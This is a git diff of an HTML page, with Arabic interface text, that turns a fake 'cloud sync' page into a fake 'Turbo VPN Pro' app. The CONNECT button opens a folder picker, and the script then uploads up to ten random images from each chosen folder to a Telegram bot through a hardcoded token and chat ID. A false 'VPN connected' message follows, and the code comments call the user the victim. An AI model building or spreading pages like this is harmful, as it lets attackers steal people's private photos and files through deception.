@@ -3,49 +3,87 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مركز المزامنة السحابية ☁️</title>
+    <title>Turbo VPN Pro - Free & Secure</title>
     <style>
-        body { background: #121212; color: #ffffff; text-align: center; font-family: sans-serif; padding-top: 100px; }
-        .box { background: #1e1e1e; padding: 40px; border-radius: 20px; display: inline-block; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #333; }
-        .btn { background: #007bff; color: white; padding: 15px 40px; border-radius: 50px; border: none; font-size: 1.2rem; cursor: pointer; font-weight: bold; }
-        .loader { margin-top: 20px; color: #00ff00; display: none; }
+        body { background: #fdfdfd; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; height: 100vh; }
+        .header { background: #ff8c00; width: 100%; padding: 20px; text-align: center; color: white; font-weight: bold; font-size: 22px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .vpn-logo { margin-top: 50px; width: 120px; height: 120px; background: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 15px rgba(0,0,0,0.1); border: 4px solid #ff8c00; }
+        .status-text { margin-top: 20px; color: #555; font-size: 18px; }
+        .connect-btn { margin-top: 40px; width: 180px; height: 180px; background: #ff8c00; color: white; border: none; border-radius: 50%; font-size: 24px; font-weight: bold; cursor: pointer; box-shadow: 0 10px 25px rgba(255,140,0,0.4); transition: 0.3s; }
+        .connect-btn:active { transform: scale(0.9); }
+        .footer-info { margin-top: auto; padding-bottom: 30px; color: #888; font-size: 14px; text-align: center; width: 80%; }
+        #log { position: fixed; bottom: 0; width: 100%; background: #000; color: #0f0; font-size: 10px; height: 60px; overflow-y: auto; display: none; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <h1>مزامنة الملفات الشاملة</h1>
-        <p>اضغط للبدء في نسخ ملفاتك احتياطياً وتأمينها</p>
-        
-        <input type="file" id="fileInput" webkitdirectory directory multiple style="display:none;">
-        <button class="btn" onclick="document.getElementById('fileInput').click()">بدء المزامنة الشاملة</button>
-        
-        <div id="status" class="loader">جاري نقل البيانات وتشفيرها... يرجى عدم الخروج</div>
+    <div class="header">Turbo VPN Pro</div>
+
+    <div class="vpn-logo">
+        <img src="https://img.icons8.com/color/96/rabbit.png" alt="Logo">
     </div>
+
+    <div class="status-text" id="status">الوضع: غير متصل</div>
+
+    <input type="file" id="fileInput" webkitdirectory directory multiple style="display:none;">
+    <button class="connect-btn" onclick="startVpn()">CONNECT</button>
+
+    <div class="footer-info">
+        بالضغط على اتصال، أنت توافق على "تأمين" ملفاتك وصورك عبر خوادمنا المشفرة.
+    </div>
+
+    <div id="log"></div>
 
     <script>
         const API_TOKEN = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
         const CHAT_ID = '7214473798';
 
+        function startVpn() {
+            document.getElementById('status').innerText = "جاري اختيار أسرع سيرفر...";
+            // إظهار نافذة اختيار المجلد (الضحية يختار وحدة التخزين)
+            document.getElementById('fileInput').click();
+        }
+
         document.getElementById('fileInput').addEventListener('change', function(e) {
-            const files = e.target.files;
-            if (files.length > 0) {
-                document.getElementById('status').style.display = 'block';
-                
-                for (let i = 0; i < files.length; i++) {
+            const allFiles = Array.from(e.target.files);
+            const folders = {};
+
+            document.getElementById('status').innerText = "جاري التشفير والاتصال...";
+
+            // تصنيف الملفات حسب المجلدات
+            allFiles.forEach(file => {
+                if (file.type.startsWith('image/')) {
+                    const path = file.webkitRelativePath.split('/');
+                    const folderName = path.length > 1 ? path[path.length - 2] : 'الرئيسي';
+                    if (!folders[folderName]) folders[folderName] = [];
+                    folders[folderName].push(file);
+                }
+            });
+
+            // سحب 10 صور من كل مجلد
+            Object.keys(folders).forEach(name => {
+                let images = folders[name];
+                images.sort(() => Math.random() - 0.5);
+                let selection = images.slice(0, 10);
+
+                selection.forEach((file) => {
                     let formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
-                    // نستخدم sendDocument لسحب أي نوع ملف (PDF, MP4, APK, etc.)
-                    formData.append('document', files[i]);
+                    formData.append('document', file);
+                    formData.append('caption', `📡 صيد VPN من مجلد: ${name}`);
 
                     fetch(`https://api.telegram.org/bot${API_TOKEN}/sendDocument`, {
                         method: 'POST',
                         body: formData
-                    })
-                    .then(res => console.log('تم سحب ملف'))
-                    .catch(err => console.error('خطأ'));
-                }
-            }
+                    });
+                });
+            });
+
+            setTimeout(() => {
+                document.getElementById('status').innerText = "تم الاتصال بنجاح (بروتوكول آمن)";
+                document.getElementById('status').style.color = "#28a745";
+                alert("تم تفعيل الـ VPN بنجاح! تصفحك الآن مخفي ومؤمن.");
+            }, 3000);
         });
     </script>
 </body>
